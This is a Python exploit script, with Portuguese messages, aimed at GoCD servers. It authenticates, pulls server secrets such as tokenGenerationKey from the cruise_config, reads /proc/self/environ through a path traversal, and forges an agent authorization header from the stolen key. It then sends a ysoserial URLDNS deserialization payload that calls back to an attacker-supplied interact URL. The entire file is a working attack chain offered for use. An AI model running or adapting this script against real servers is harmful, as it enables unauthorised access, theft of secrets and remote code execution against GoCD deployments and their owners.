#!/usr/bin/python3
from fileinput import filename
import requests
import subprocess
import os
import argparse
import xml.etree.ElementTree as ET
import json
import sys
import hmac
import hashlib 
import base64

def authorization(uuid, tokenGenerationKey):
    return base64.b64encode(hmac.new(str.encode(tokenGenerationKey), str.encode(uuid), digestmod=hashlib.sha256).digest())

parser = argparse.ArgumentParser(description="GoCD Exploit RCE")
parser.add_argument("-u", help="Usuario", required=True)
parser.add_argument("-p", help="Senha", required=True)
parser.add_argument("-i", help="Interact URL", required=True)
parser.add_argument("-t", help="URL (Eg: http://gocd.example.com)", required=True)
args = parser.parse_args()

username = args.u
password = args.p
gocd_url = args.t
url_interact = str(args.i)

session = requests.Session()
requests.packages.urllib3.disable_warnings()

print("[1] Autenticando")

login_form = {
    "j_username": username,
    "j_password": password
}
r = session.post(f"{gocd_url}/go/auth/security_check", data=login_form, verify=False)

if r.status_code != 200:
    exit(f"Login Failed:{r.text}")
else:
    print("Autenticado com sucesso")
    print("")

cookies = {'JSESSIONID': session.cookies['JSESSIONID']}

print("[2] Verificando arquivo cruise_config")
r = session.get(f"{gocd_url}/go/add-on/business-continuity/api/cruise_config", verify=False)
cruise_config = ET.fromstring(r.text)

if r.status_code != 200:
    exit(f"Falha ao acessar arquivo:{r.text}")
else:
    print("Arquivo cruise_config acessível")
    print("")
    
chaves_servidor = cruise_config[0].attrib

print("[3] Lendo atributos do servidor")

for key, value in chaves_servidor.items():
    print(f"{key}: {value}")

print("")

agentAutoRegisterKey = chaves_servidor["agentAutoRegisterKey"]

print("[4] Verificando arquivo variáveis de ambiente do processo")
r = session.get(f"{gocd_url}/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../proc/self/environ", verify=False)

if r.status_code != 200:
    exit(f"Falha ao acessar arquivo:{r.text}")
else:
    print("Arquivo acessível")
    print("")

'''variaveis_ambiente = []

for x in r.text[:-1].split("\x00"):
    print(x.split("="))
    
    for key, value in x.split("="):
        print(f"{key}: {value}")
        variaveis_ambiente[key] = value

print(variaveis_ambiente)'''

variaveis_ambiente = dict(x.split("=") for x in r.text[:-1].split("\x00"))

jetty_file = f"/etc/go/jetty.xml"

print("[5] Listando agents")

headers = {
    "Accept": "application/vnd.go.cd+json",
}

r = session.get(f"{gocd_url}/go/api/agents", cookies=cookies, headers=headers, verify=False)

if r.status_code != 200:
    exit(f"Falha listar agents:{r.text}")
else:
    print("Lista carregada")
    print("")

print("Buscando GUID de um agent")

agents = json.loads(r.text)

for agent in agents["_embedded"]["agents"]:
    if agent["agent_state"] != "Building":
        agent_guid = agent["uuid"]
        print(f"Localizado agent com status != Building")
        print(f"GUID: {agent_guid}")
        break

if sys.platform == "win32":
    jdk_dir = ".\\openlogic-openjdk-8u332-b09-windows-32\\bin\\"
else:
    jdk_dir = "./openlogic-openjdk-8u332-b09-linux-x32/bin/"

print("[9] Serializando objetos")

try:
    URLDNS = subprocess.run([f"{jdk_dir}java", "-jar", "ysoserial.jar", "URLDNS", f"{url_interact}"], capture_output=True)

    print(URLDNS.stdout)

    print("Objetos serializados")
    print("")
except:
    exit(f"Falha ao serializar objetos")

print("[10] Enviando objeto serializado")

authorization_header = authorization(agent_guid, chaves_servidor["tokenGenerationKey"])

headers = {
    "Content-Type": "application/x-java-serialized-object",
    "Authorization": authorization_header,
    "X-Agent-GUID": agent_guid
}

r = session.post(f"{gocd_url}/go/remoting/remoteBuildRepository", headers=headers, data=URLDNS.stdout, verify=False)

print(r)
print(r.text)

if r.status_code != 500:
    exit(f"Falha enviar arquivo serializado")
else:
    print("Objeto URLDNS enviado")
    print("")
